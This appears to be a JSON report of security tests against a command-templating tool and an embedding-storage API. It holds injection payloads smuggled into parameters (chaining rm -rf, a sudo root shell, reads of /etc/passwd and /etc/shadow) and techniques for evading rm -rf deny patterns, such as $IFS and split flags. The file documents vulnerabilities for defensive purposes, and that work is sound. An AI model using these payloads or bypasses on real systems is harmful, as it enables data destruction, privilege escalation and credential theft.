{
  "demonstration_summary": {
    "total_vulnerabilities": 4,
    "critical_count": 3,
    "high_count": 1,
    "timestamp": "2025-06-08T22:11:50Z"
  },
  "detailed_results": {
    "command_injection": {
      "vulnerability": "BASH-001",
      "title": "Command Injection via Parameter Substitution",
      "severity": "CRITICAL",
      "test_results": [
        {
          "test_name": "Basic Command Injection",
          "template": "ls {path}",
          "params": {
            "path": "/tmp; echo 'INJECTED COMMAND EXECUTED'; echo"
          },
          "vulnerable_command": "ls /tmp; echo 'INJECTED COMMAND EXECUTED'; echo",
          "injection_detected": true,
          "injected_content": [
            "/tmp; echo 'INJECTED COMMAND EXECUTED'; echo"
          ]
        },
        {
          "test_name": "Destructive Command Chain",
          "template": "cat {file}",
          "params": {
            "file": "/etc/passwd; rm -rf /tmp/test_file; echo 'FILE DELETED'"
          },
          "vulnerable_command": "cat /etc/passwd; rm -rf /tmp/test_file; echo 'FILE DELETED'",
          "injection_detected": true,
          "injected_content": [
            "/etc/passwd; rm -rf /tmp/test_file; echo 'FILE DELETED'"
          ]
        },
        {
          "test_name": "Privilege Escalation Attempt",
          "template": "echo {value} > {file}",
          "params": {
            "value": "test",
            "file": "/tmp/test; sudo whoami; echo 'PRIVILEGE CHECK'"
          },
          "vulnerable_command": "echo test > /tmp/test; sudo whoami; echo 'PRIVILEGE CHECK'",
          "injection_detected": true,
          "injected_content": [
            "/tmp/test; sudo whoami; echo 'PRIVILEGE CHECK'"
          ]
        },
        {
          "test_name": "Environment Variable Injection",
          "template": "export {var}={value} && echo 'Set variable'",
          "params": {
            "var": "TEST",
            "value": "safe; export MALICIOUS=injected; echo 'ENV POISONED'"
          },
          "vulnerable_command": "export TEST=safe; export MALICIOUS=injected; echo 'ENV POISONED' && echo 'Set variable'",
          "injection_detected": true,
          "injected_content": [
            "safe; export MALICIOUS=injected; echo 'ENV POISONED'"
          ]
        }
      ]
    },
    "sudo_injection": {
      "vulnerability": "BASH-004",
      "title": "Sudo Command Injection",
      "severity": "CRITICAL",
      "test_results": [
        {
          "command_name": "CPU State Control",
          "template": "echo {mode} | sudo tee /sys/devices/system/cpu/amd_pstate/status",
          "malicious_param": "performance; sudo /bin/bash; echo hidden",
          "vulnerable_command": "echo performance; sudo /bin/bash; echo hidden | sudo tee /sys/devices/system/cpu/amd_pstate/status",
          "sudo_injection": true,
          "sensitive_file_access": false
        },
        {
          "command_name": "Memory Cache Control",
          "template": "sync && echo {level} | sudo tee /proc/sys/vm/drop_caches && free -h",
          "malicious_param": "3; sudo whoami; echo 'ROOT ACCESS'",
          "vulnerable_command": "sync && echo 3; sudo whoami; echo 'ROOT ACCESS' | sudo tee /proc/sys/vm/drop_caches && free -h",
          "sudo_injection": true,
          "sensitive_file_access": false
        },
        {
          "command_name": "Kernel Parameter",
          "template": "echo {value} | sudo tee /proc/sys/kernel/speculation_control",
          "malicious_param": "1; sudo cat /etc/shadow | head -1; echo 'SHADOW ACCESSED'",
          "vulnerable_command": "echo 1; sudo cat /etc/shadow | head -1; echo 'SHADOW ACCESSED' | sudo tee /proc/sys/kernel/speculation_control",
          "sudo_injection": true,
          "sensitive_file_access": true
        }
      ]
    },
    "pattern_bypass": {
      "vulnerability": "BASH-003",
      "title": "Security Pattern Bypass",
      "severity": "HIGH",
      "test_results": [
        {
          "bypass_name": "Variable Substitution Bypass",
          "target_pattern": "rm\\s+-rf\\s+/",
          "original_command": "rm -rf /",
          "bypass_command": "rm${IFS}-rf${IFS}/",
          "technique": "Use $IFS (Internal Field Separator) variable",
          "bypass_successful": true
        },
        {
          "bypass_name": "Multiple Space Bypass",
          "target_pattern": "rm\\s+-rf\\s+/",
          "original_command": "rm -rf /",
          "bypass_command": "rm  -rf  /",
          "technique": "Multiple spaces to evade single \\s pattern",
          "bypass_successful": false
        },
        {
          "bypass_name": "Separated Flag Bypass",
          "target_pattern": "rm\\s+-rf\\s+/",
          "original_command": "rm -rf /",
          "bypass_command": "rm -r -f /",
          "technique": "Separate combined flags",
          "bypass_successful": true
        },
        {
          "bypass_name": "Command Substitution Bypass",
          "target_pattern": ";\\s*rm\\s+-rf",
          "original_command": "ls; rm -rf /tmp",
          "bypass_command": "ls $(echo ';') rm -rf /tmp",
          "technique": "Use command substitution to hide semicolon",
          "bypass_successful": false
        },
        {
          "bypass_name": "Backtick Bypass",
          "target_pattern": ";\\s*rm\\s+-rf",
          "original_command": "ls; rm -rf /tmp",
          "bypass_command": "ls `echo ';'` rm -rf /tmp",
          "technique": "Use backticks for command substitution",
          "bypass_successful": false
        },
        {
          "bypass_name": "ANSI-C Quoting Bypass",
          "target_pattern": ";\\s*rm\\s+-rf",
          "original_command": "ls; rm -rf /tmp",
          "bypass_command": "ls $'\\n' rm -rf /tmp",
          "technique": "Use ANSI-C quoting with newline",
          "bypass_successful": false
        }
      ]
    },
    "htm_vulnerabilities": {
      "vulnerabilities": [
        "CBC-001",
        "CBC-005"
      ],
      "title": "HTM Storage and API Security Issues",
      "severity": "CRITICAL/HIGH",
      "storage_vulnerability": {
        "issue": "Unencrypted storage",
        "sensitive_data_example": {
          "id": "uuid-12345",
          "embedding_vector": [
            0.1,
            0.2,
            0.3,
            "...",
            "768 dimensions"
          ],
          "file_path": "/proprietary/secret_algorithm.py",
          "semantic_tags": [
            "authentication",
            "crypto",
            "password_hash"
          ],
          "dependencies": [
            "internal_crypto_lib",
            "secret_key_manager"
          ],
          "complexity_score": 9.8,
          "metadata": {
            "project": "TOP_SECRET_PROJECT",
            "author": "john.doe@company.com",
            "classification": "CONFIDENTIAL"
          }
        },
        "impact": "Information disclosure and IP theft"
      },
      "api_vulnerability": {
        "issue": "Missing authentication",
        "vulnerable_endpoints": [
          {
            "endpoint": "CrawlDirectory",
            "description": "Crawl any directory without authorization",
            "risk": "Unauthorized file system access"
          },
          {
            "endpoint": "QueryByResonance",
            "description": "Query sensitive embeddings without authentication",
            "risk": "Data exfiltration and IP theft"
          },
          {
            "endpoint": "ExecuteTool",
            "description": "Execute any tool without permission check",
            "risk": "Arbitrary tool execution"
          },
          {
            "endpoint": "StoreEmbedding",
            "description": "Store malicious embeddings without validation",
            "risk": "Data poisoning attacks"
          }
        ],
        "impact": "Complete unauthorized system access"
      }
    }
  }
}